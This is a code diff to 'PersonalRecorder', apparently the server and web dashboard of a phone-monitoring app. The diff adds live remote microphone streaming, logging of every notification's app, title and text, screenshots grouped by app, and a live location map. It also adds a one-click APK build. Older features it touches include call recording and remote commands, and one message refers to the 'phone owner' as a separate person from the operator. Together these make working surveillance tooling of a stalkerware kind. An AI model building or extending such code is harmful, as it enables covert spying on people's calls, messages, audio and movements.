@@ -66,6 +66,7 @@ COMMAND_TYPES = {
     "deviceaudio_start", "deviceaudio_stop",
     "call_video_start", "call_video_stop",
     "call_audio_start", "call_audio_stop",
+    "audio_live_start", "audio_live_stop",
 }
 PENDING_TTL_SECONDS = 300
 DEVICE_WS_PATH = "/ws"       # the app connects here
@@ -431,7 +432,8 @@ async def device_ws_handler(request: web.Request) -> web.WebSocketResponse:
                     target.write_bytes(raw)
                     index_media(data_dir, "img", f"media/img/{fname}", len(raw),
                                 {"w": payload.get("width"), "h": payload.get("height"),
-                                 "src": payload.get("path")},
+                                 "src": payload.get("path"),
+                                 "app": payload.get("app") or "unknown"},
                                 dev=my_dev, dev_name=dev_name)
                     log(f"* screenshot saved {target.name} ({len(raw)} bytes) [{my_dev}]")
                     push_event("screenshot", {"name": target.name, "size": len(raw), "dev": my_dev})
@@ -453,6 +455,28 @@ async def device_ws_handler(request: web.Request) -> web.WebSocketResponse:
         if mtype == "ack":
             log(f"* ack from {my_dev}: {payload.get('cmd')}")
             push_event("ack", payload, ts)
+
+        if mtype == "notification":
+            # Notification log: persisted to notifications.jsonl and pushed
+            # to the browser tab (Notifications tab).
+            notif = {"pkg": payload.get("pkg"), "title": payload.get("title"),
+                     "text": payload.get("text"), "when": payload.get("when"),
+                     "key": payload.get("key"), "category": payload.get("category"),
+                     "ts": ts or int(time.time() * 1000), "dev": my_dev}
+            try:
+                (data_dir / "notifications.jsonl").open("a").write(json.dumps(notif) + "\n")
+            except Exception:
+                pass
+            push_event("notification", notif, notif["ts"])
+            log(f"* notification [{my_dev}] {payload.get('pkg')}: {payload.get('title')}")
+            continue
+
+        if mtype == "audio_live_chunk":
+            # Live mic stream: forwarded straight to open browser tabs (the
+            # Web Audio player). Not stored in the event ring -- it is a
+            # high-rate stream, not a log entry.
+            broadcast_ui(json.dumps({"type": "audio_live", "payload": payload, "ts": ts}))
+            continue
 
         # everything else: generic event (capture_started, recording_*, ...)
         log(f"* event {mtype} [{my_dev}]: {payload}")
@@ -590,6 +614,86 @@ async def api_events(request: web.Request) -> web.Response:
     return web.json_response(list(event_ring)[-limit:])
 
 
+async def api_notifications(request: web.Request) -> web.Response:
+    """Notification log (newest first). Persisted by the app as `notification`
+    events; the browser Notifications tab polls this endpoint."""
+    check_auth(request)
+    limit = int(request.query.get("limit", 200))
+    f = request.app["data_dir"] / "notifications.jsonl"
+    out: list[dict] = []
+    if f.exists():
+        try:
+            for line in f.read_text().splitlines()[-limit:]:
+                try:
+                    out.append(json.loads(line))
+                except json.JSONDecodeError:
+                    continue
+        except Exception:
+            pass
+    out.sort(key=lambda n: n.get("ts", 0), reverse=True)
+    return web.json_response({"notifications": out})
+
+
+async def api_build(request: web.Request) -> web.Response:
+    """Trigger a GitHub Actions build of the APK from the dashboard.
+    Uses the GITHUB_TOKEN environment variable (workflow scope) or falls
+    back to the `gh` CLI if it is authenticated. The workflow_dispatch
+    trigger in .github/workflows/ci.yml runs the `apk` job, which uploads
+    the built APK as an artifact."""
+    check_auth(request)
+    if request.method != "POST":
+        return web.json_response({"error": "POST only"}, status=405)
+    repo = os.environ.get("GITHUB_REPO", "").strip() or "darknight24865-source/PersonalRecorder"
+    token = os.environ.get("GITHUB_TOKEN", "").strip()
+    if not token:
+        # Fall back to the gh CLI (authenticated with workflow scope).
+        try:
+            proc = await asyncio.create_subprocess_exec(
+                "gh", "auth", "token",
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.DEVNULL,
+            )
+            out, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
+            token = out.decode().strip()
+        except Exception:
+            token = ""
+    if not token:
+        return web.json_response(
+            {"ok": False,
+             "error": "No GitHub token: set GITHUB_TOKEN (workflow scope) when starting the dashboard, or run `gh auth login` with workflow scope."},
+            status=400)
+    url = f"https://api.github.com/repos/{repo}/actions/workflows/ci.yml/dispatches"
+    headers = {
+        "Authorization": f"Bearer {token}",
+        "Accept": "application/vnd.github+json",
+        "Content-Type": "application/json",
+    }
+    body = json.dumps({"ref": "main"})
+    # Use certifi's CA bundle when available (macOS python.org builds do not
+    # load the system keychain by default, which breaks TLS to api.github.com).
+    ssl_ctx = None
+    try:
+        import certifi
+        import ssl as _ssl
+        ssl_ctx = _ssl.create_default_context(cafile=certifi.where())
+    except Exception:
+        ssl_ctx = None
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.post(url, headers=headers, data=body, ssl=ssl_ctx) as resp:
+                if resp.status in (200, 201, 204):
+                    log("* build requested: workflow_dispatch on ci.yml (main)")
+                    return web.json_response(
+                        {"ok": True,
+                         "message": "Build triggered — watch the Actions tab of the repo for the app-debug-apk artifact."})
+                text = await resp.text()
+                return web.json_response(
+                    {"ok": False, "error": f"GitHub API {resp.status}: {text[:300]}"},
+                    status=502)
+    except Exception as exc:
+        return web.json_response({"ok": False, "error": f"request failed: {exc}"}, status=502)
+
+
 async def api_denied(request: web.Request) -> web.Response:
     return web.json_response({"error": "auth required"}, status=401)
 
@@ -700,6 +804,8 @@ def main() -> None:
     app.router.add_get("/api/status", api_status)
     app.router.add_get("/api/devices", api_devices)
     app.router.add_get("/api/events", api_events)
+    app.router.add_get("/api/notifications", api_notifications)
+    app.router.add_post("/api/build", api_build)
     app.router.add_get("/api/denied", api_denied)
 
     ssl_ctx = None
@@ -726,6 +832,8 @@ INDEX_HTML = r"""<!doctype html>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>PersonalRecorder — monitor</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" crossorigin="">
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
 <style>
 :root{--bg:#0f1117;--panel:#161a24;--panel2:#1c2230;--line:#2a3348;--txt:#e6e9f0;--dim:#8fa1c0;--acc:#3b82f6;--ok:#22c55e;--warn:#f59e0b;--err:#ef4444}
 *{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--txt);
@@ -770,7 +878,10 @@ padding:8px 14px;cursor:pointer;font-size:13px;transition:all .12s}
 table{width:100%;border-collapse:collapse;background:var(--panel);border:1px solid var(--line);border-radius:10px;overflow:hidden}
 th,td{padding:8px 10px;text-align:left;font-size:12px;border-bottom:1px solid var(--line)}
 th{color:var(--dim);font-weight:600;background:var(--panel2)}
-#map{cursor:crosshair}
+#map{position:relative;z-index:0;height:420px;border-radius:10px;background:#0f1117}
+.apphead{display:flex;align-items:baseline;gap:8px;margin:16px 0 6px;font-size:13px}
+.apphead .dim{color:var(--dim);font-size:11px}
+.notif-text{color:var(--dim);max-width:520px;white-space:normal;word-break:break-word}
 #lightbox{position:fixed;inset:0;background:rgba(0,0,0,.85);display:none;align-items:center;justify-content:center;z-index:50}
 #lightbox img{max-width:94vw;max-height:92vh;border-radius:6px}
 #lightbox.on{display:flex}
@@ -786,6 +897,7 @@ a{color:var(--acc)}
   <span id="pQueue" class="pill">queue 0</span>
   <span class="pill" id="pUptime"></span>
   <a href="/logout" style="font-size:12px;color:var(--dim)">logout</a>
+  <button id="btnBuild" class="cmd" style="padding:5px 10px;font-size:12px" title="Trigger a GitHub Actions build of the APK (needs GITHUB_TOKEN or gh auth with workflow scope)">🛠 Build APK</button>
   <nav>
     <button data-tab="img" class="active">Screenshots</button>
     <button data-tab="video">Videos</button>
@@ -793,6 +905,7 @@ a{color:var(--acc)}
     <button data-tab="call_video">Video calls</button>
     <button data-tab="call_audio">Audio calls</button>
     <button data-tab="location">Location</button>
+    <button data-tab="notifs">Notifications</button>
     <button data-tab="devices">Devices</button>
     <button data-tab="log">Live log</button>
   </nav>
@@ -813,6 +926,8 @@ a{color:var(--acc)}
     <button class="cmd" data-cmd="call_video_stop" disabled>Video call off</button>
     <button class="cmd" data-cmd="call_audio_start">📞 Audio call on</button>
     <button class="cmd" data-cmd="call_audio_stop" disabled>Audio call off</button>
+    <button class="cmd cmd-liveaudio" data-cmd="audio_live_start">🔴 Live audio on</button>
+    <button class="cmd cmd-liveaudio" data-cmd="audio_live_stop" disabled>Live audio off</button>
   </div>
   <div id="wrap"></div>
 </main>
@@ -820,7 +935,7 @@ a{color:var(--acc)}
 <script>
 const $=id=>document.getElementById(id);
 const wrap=$('wrap');const logEl=$('log');
-const TABS={img:'Screenshots',video:'Videos',audio:'Audio',call_video:'Video calls',call_audio:'Audio calls',location:'Location',devices:'Devices',log:'Live log'};
+const TABS={img:'Screenshots',video:'Videos',audio:'Audio',call_video:'Video calls',call_audio:'Audio calls',location:'Location',notifs:'Notifications',devices:'Devices',log:'Live log'};
 let tab='img';
 
 /* ---------- tabs openers (called on demand) ---------- */
@@ -833,6 +948,7 @@ async function openTab(name){
   if(name==='call_video'){wrap.innerHTML='<div class="empty">loading…</div>';renderCallVideos(await fetchJSON('/api/files?kind=video&category=call_video'));}
   if(name==='call_audio'){wrap.innerHTML='<div class="empty">loading…</div>';renderCallAudios(await fetchJSON('/api/files?kind=audio&category=call_audio'));}
   if(name==='location'){renderLocations();}
+  if(name==='notifs'){renderNotifs();}
   if(name==='devices'){renderDevices();}
   if(name==='log'){wrap.innerHTML='<div id="log"></div>';logEl=$('log');copyLog();}
 }
@@ -878,16 +994,28 @@ function sendCmd(cmd,to){if(!ui||ui.readyState!==1){logLine('not connected to mo
 
 function renderImgs(files){
   if(!files.length){wrap.innerHTML='<div class="empty">no screenshots yet — press "Screenshot now" or wait for the 2 s auto-capture</div>';return;}
-  const g=document.createElement('div');g.className='grid';
+  const groups={};
   for(const f of files){
-    const c=document.createElement('div');c.className='card';
-    const img=document.createElement('img');img.src=f.url;img.loading='lazy';
-    const cap=document.createElement('div');cap.className='cap';
-    cap.innerHTML=`<span>${new Date(f.ts).toLocaleTimeString()}</span><span>${(f.size/1024).toFixed(0)} KB</span>`;
-    c.onclick=()=>{img.src=f.url;$('lightboxImg').src=f.url;$('lightbox').classList.add('on');};
-    c.append(img,cap);g.append(c);
+    const app=(f.meta&&f.meta.app)||'unknown';
+    (groups[app]=groups[app]||[]).push(f);
   }
-  wrap.innerHTML='';wrap.append(g);
+  const apps=Object.keys(groups).sort((a,b)=>groups[b].length-groups[a].length);
+  const root=document.createElement('div');
+  for(const app of apps){
+    const h=document.createElement('div');h.className='apphead';
+    h.innerHTML=`<b>${esc(app)}</b><span class="dim">${groups[app].length} shots</span>`;
+    const g=document.createElement('div');g.className='grid';
+    for(const f of groups[app]){
+      const c=document.createElement('div');c.className='card';
+      const img=document.createElement('img');img.src=f.url;img.loading='lazy';
+      const cap=document.createElement('div');cap.className='cap';
+      cap.innerHTML=`<span>${new Date(f.ts).toLocaleTimeString()}</span><span>${(f.size/1024).toFixed(0)} KB</span>`;
+      c.onclick=()=>{$('lightboxImg').src=f.url;$('lightbox').classList.add('on');};
+      c.append(img,cap);g.append(c);
+    }
+    root.append(h,g);
+  }
+  wrap.innerHTML='';wrap.append(root);
 }
 function renderVideos(files){
   if(!files.length){wrap.innerHTML='<div class="empty">no videos yet — press "Record on", wait, then "Record off"; the MP4 is uploaded automatically</div>';return;}
@@ -937,10 +1065,28 @@ function renderCallAudios(files){
   }
   wrap.innerHTML='';wrap.append(l);
 }
+async function renderNotifs(){
+  const data=await fetchJSON('/api/notifications');
+  const notifs=data.notifications||[];
+  wrap.innerHTML='';
+  if(!notifs.length){wrap.innerHTML='<div class="empty">no notifications yet — enable the app's notification access (Settings → Special access → Notification access) and every notification lands here live</div>';return;}
+  const l=document.createElement('div');l.className='media-list';
+  for(const n of notifs.slice().reverse()){
+    const it=document.createElement('div');it.className='media-item';
+    const m=document.createElement('div');m.className='meta';
+    m.innerHTML=`<b>${esc(n.pkg||'unknown')}</b> · ${new Date(n.ts).toLocaleString()}<br><span class="notif-text">${esc(n.title||'')}${n.text?' — '+esc(n.text):''}</span>`;
+    it.append(m);l.append(it);
+  }
+  wrap.innerHTML='';wrap.append(l);
+}
 async function renderLocations(){
   const data=await fetchJSON('/api/locations');
   const locs=data.locations||[];
   wrap.innerHTML='';
+  const card=document.createElement('div');card.className='media-item';
+  card.innerHTML='<div style="margin-bottom:8px;color:var(--dim)">live position (Leaflet + OpenStreetMap)</div>';
+  const div=document.createElement('div');div.id='map';
+  card.append(div);
   const table=document.createElement('table');
   table.innerHTML='<tr><th>time</th><th>lat</th><th>lon</th><th>accuracy m</th><th>device</th></tr>';
   if(!locs.length){table.innerHTML+='<tr><td colspan="5" class="empty">no fixes yet — press "Location on"</td></tr>';}
@@ -949,28 +1095,28 @@ async function renderLocations(){
     tr.innerHTML=`<td>${new Date(l.ts).toLocaleString()}</td><td>${l.lat}</td><td>${l.lon}</td><td>${l.accuracy??''}</td><td>${esc(l.dev||'')}</td>`;
     table.append(tr);
   }
-  const card=document.createElement('div');card.className='media-item';
-  card.innerHTML='<div style="margin-bottom:8px;color:var(--dim)">position plot (offline, canvas)</div>';
-  const cv=document.createElement('canvas');cv.id='map';cv.width=900;cv.height=240;
-  card.append(cv,table);
+  card.append(table);
   wrap.append(card);
-  drawMap(locs);
+  drawLeaf(locs);
 }
-function drawMap(locs){
-  const cv=$('map');if(!cv)return;
-  const ctx=cv.getContext('2d');
-  ctx.fillStyle='#0f1117';ctx.fillRect(0,0,cv.width,cv.height);
-  if(locs.length<2){ctx.fillStyle='#8fa1c0';ctx.font='13px monospace';ctx.fillText(locs.length?'waiting for a second fix…':'waiting for location fixes…',20,24);return;}
-  const lats=locs.map(l=>l.lat),lons=locs.map(l=>l.lon);
-  const minLat=Math.min(...lats),maxLat=Math.max(...lats),minLon=Math.min(...lons),maxLon=Math.max(...lons);
-  const pad=30,sx=cv.width-pad*2,sy=cv.height-pad*2;
-  const x=l=>pad+((l.lon-minLon)/((maxLon-minLon)||1))*sx;
-  const y=l=>pad+((maxLat-l.lat)/((maxLat-minLat)||1))*sy;
-  ctx.strokeStyle='#3b82f6';ctx.lineWidth=1.6;ctx.beginPath();
-  locs.forEach((l,i)=>i?ctx.lineTo(x(l.lon),y(l.lat)):ctx.moveTo(x(l.lon),y(l.lat)));ctx.stroke();
-  locs.forEach((l,i)=>{ctx.fillStyle='#22c55e';ctx.beginPath();ctx.arc(x(l.lon),y(l.lat),i===locs.length-1?5:2.5,0,7);ctx.fill();});
-  ctx.fillStyle='#8fa1c0';ctx.font='11px monospace';
-  ctx.fillText(`${locs.length} fixes · last ${lats[lats.length-1].toFixed(5)},${lons[lons.length-1].toFixed(5)}`,pad,cv.height-8);
+let map=null,mapFitted=false,mapLayers=[];
+function drawLeaf(locs){
+  if(!window.L)return;
+  if(!map){
+    map=L.map('map').setView([20,0],2);
+    L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:19,attribution:'© OpenStreetMap'}).addTo(map);
+  }
+  mapLayers.forEach(l=>map.removeLayer(l));mapLayers=[];
+  if(!locs.length)return;
+  const pts=locs.map(l=>[l.lat,l.lon]);
+  const line=L.polyline(pts,{color:'#3b82f6',weight:2}).addTo(map);
+  mapLayers.push(line);
+  locs.forEach((l,i)=>{
+    const m=L.circleMarker([l.lat,l.lon],{radius:i===locs.length-1?7:3,color:'#22c55e',fillColor:'#22c55e',fillOpacity:.9}).addTo(map);
+    m.bindPopup(`${new Date(l.ts).toLocaleString()}<br>${l.lat},${l.lon} · acc ${l.accuracy??'?'} m`);
+    mapLayers.push(m);
+  });
+  if(!mapFitted&&locs.length){map.fitBounds(L.latLngBounds(pts).pad(0.15));mapFitted=true;}
 }
 /* ---------- live log ---------- */
 function logLine(txt,cls){
@@ -1003,12 +1149,17 @@ function connect(){
       return;
     }
     if(m.type==='file'){if(tab==='img'&&m.file.kind==='img')openTab('img');if(tab==='video'&&m.file.kind==='video')openTab('video');if(tab==='audio'&&m.file.kind==='audio')openTab('audio');if(tab==='call_video'&&m.file.kind==='video'&&m.file.category==='call_video')openTab('call_video');if(tab==='call_audio'&&m.file.kind==='audio'&&m.file.category==='call_audio')openTab('call_audio');return;}
+    if(m.type==='audio_live'){pushLiveChunk(m.payload);return;}
     if(m.type!=='ev')return;
     const ev=m.event,t=ev.type,p=ev.payload;
     if(t==='device_online'){logLine(`device connected: ${p.name?esc(p.name)+' ('+esc(p.id)+')':('id: '+esc(p.id))}`,'good');refreshDevices();}
     else if(t==='device_offline'){logLine(`device offline: ${p.name?esc(p.name)+' ('+esc(p.id)+')':('id: '+esc(p.id))}`,'bad');refreshDevices();}
     else if(t==='ack'){logLine(`✓ command '${p.cmd}' confirmed by device`,'good');}
     else if(t==='location'){logLine(`📍 ${p.lat},${p.lon} · acc ${p.accuracy} m`);if(tab==='location')renderLocations();}
+    else if(t==='notification'){logLine(`🔔 ${p.pkg?esc(p.pkg)+': ':''}${esc(p.title||p.text||'notification')}`);if(tab==='notifs')renderNotifs();}
+    else if(t==='audio_live_started'){logLine('🔴 live audio streaming started','good');}
+    else if(t==='audio_live_stopped'){logLine('live audio stopped');}
+    else if(t==='audio_live_error'){logLine(`⚠ live audio error: ${p.reason||'unknown'}`,'bad');}
     else if(t==='screenshot'){logLine(`📷 screenshot received`,'good');}
     else if(t==='media_uploaded'){logLine(`⬆ ${p.kind||'file'} uploaded (${(p.size/1024).toFixed(0)} KB)`+(p.category?` [${p.category}]`:''),'good');if(tab==='video'&&p.kind==='video')openTab('video');if(tab==='audio'&&p.kind==='audio')openTab('audio');if(tab==='call_video'&&p.kind==='video'&&p.category==='call_video')openTab('call_video');if(tab==='call_audio'&&p.kind==='audio'&&p.category==='call_audio')openTab('call_audio');}
     else if(t==='capture_consent_needed'||t==='record_consent_needed'||t==='deviceaudio_consent_needed'||t==='call_video_consent_needed'){logLine(`⚠ ${p.reason==='screen_capture_consent_required'?'phone owner must tap the screen-capture button once':p.reason}`,'bad');}
@@ -1018,7 +1169,7 @@ function connect(){
 }
 /* ---------- commands ---------- */
 const STOPS={mic:'mic_stop',location:'location_stop',record:'record_stop',deviceaudio:'deviceaudio_stop',call_video:'call_video_stop',call_audio:'call_audio_stop'};
-document.querySelectorAll('.cmd').forEach(b=>{
+document.querySelectorAll('.cmd:not(.cmd-liveaudio)').forEach(b=>{
   b.onclick=()=>{
     if(!ui||ui.readyState!==1){logLine('not connected to monitor — retrying…','bad');return;}
     const c=b.dataset.cmd;
@@ -1033,6 +1184,71 @@ document.querySelectorAll('.cmd').forEach(b=>{
     }
   };
 });
+/* ---------- live audio player (Web Audio) ---------- */
+let liveCtx=null,liveGain=null,liveBuf=[],livePlaying=false;
+function ensureLiveCtx(){
+  if(!liveCtx){
+    liveCtx=new (window.AudioContext||window.webkitAudioContext)();
+    liveGain=liveCtx.createGain();liveGain.gain.value=1;liveGain.connect(liveCtx.destination);
+  }
+  if(liveCtx.state==='suspended')liveCtx.resume();
+  return liveCtx;
+}
+function pushLiveChunk(payload){
+  if(!payload||!payload.data)return;
+  const ctx=ensureLiveCtx();
+  const raw=atob(payload.data);
+  const n=raw.length>>1;
+  const src=new Int16Array(n);
+  for(let i=0;i<n;i++)src[i]=raw.charCodeAt(i*2)|(raw.charCodeAt(i*2+1)<<8);
+  const inRate=payload.rate||16000,outRate=ctx.sampleRate;
+  const outLen=Math.max(1,Math.round(n*outRate/inRate));
+  const out=new Float32Array(outLen);
+  for(let i=0;i<outLen;i++){
+    const j=Math.min(n-1,Math.floor(i*inRate/outRate));
+    out[i]=src[j]/32768;
+  }
+  liveBuf.push(out);
+  if(liveBuf.length>2)liveBuf.shift(); // ~2 s cap
+  if(!livePlaying){
+    livePlaying=true;
+    const sp=ctx.createScriptProcessor(4096,0,1);
+    sp.onaudioprocess=e=>{
+      const outCh=e.outputBuffer.getChannelData(0);
+      if(liveBuf.length){
+        const b=liveBuf[0];
+        const take=Math.min(outCh.length,b.length);
+        outCh.set(b.subarray(0,take),0);
+        if(take<b.length)liveBuf[0]=b.subarray(take);
+        else liveBuf.shift();
+      }
+    };
+    sp.connect(liveGain);
+    liveCtx._sp=sp;
+  }
+}
+function toggleLiveAudio(on){
+  if(!ui||ui.readyState!==1){logLine('not connected to monitor — retrying…','bad');return;}
+  const sel=$('pTarget'),to=sel&&sel.value?sel.value:undefined;
+  const c=on?'audio_live_start':'audio_live_stop';
+  ui.send(JSON.stringify(to?{type:c,to}:{type:c}));
+  logLine(`> sent '${c}'${to?' → '+to:''}`);
+  const a=document.querySelector('[data-cmd="audio_live_start"]'),b=document.querySelector('[data-cmd="audio_live_stop"]');
+  if(a&&b){a.disabled=on;a.classList.toggle('active',on);b.disabled=!on;}
+}
+document.querySelectorAll('.cmd-liveaudio').forEach(b=>{
+  b.onclick=()=>toggleLiveAudio(b.dataset.cmd==='audio_live_start');
+});
+$('btnBuild').onclick=async()=>{
+  const b=$('btnBuild');b.disabled=true;b.textContent='⏳ building…';
+  try{
+    const r=await fetch('/api/build',{method:'POST'});
+    const j=await r.json().catch(()=>({}));
+    if(r.ok&&j.ok){logLine(`🛠 build triggered: ${j.run_url||'see the Actions tab'}`,'good');}
+    else{logLine(`⚠ build failed: ${j.error||r.status}`,'bad');}
+  }catch(e){logLine(`⚠ build request error: ${e}`,'bad');}
+  b.disabled=false;b.textContent='🛠 Build APK';
+};
 document.querySelectorAll('nav button').forEach(b=>b.onclick=()=>openTab(b.dataset.tab));
 $('lightbox').onclick=()=>$('lightbox').classList.remove('on');
 setInterval(()=>{if(ui&&ui.readyState===1)ui.send(JSON.stringify({type:'ping'}));},10000);
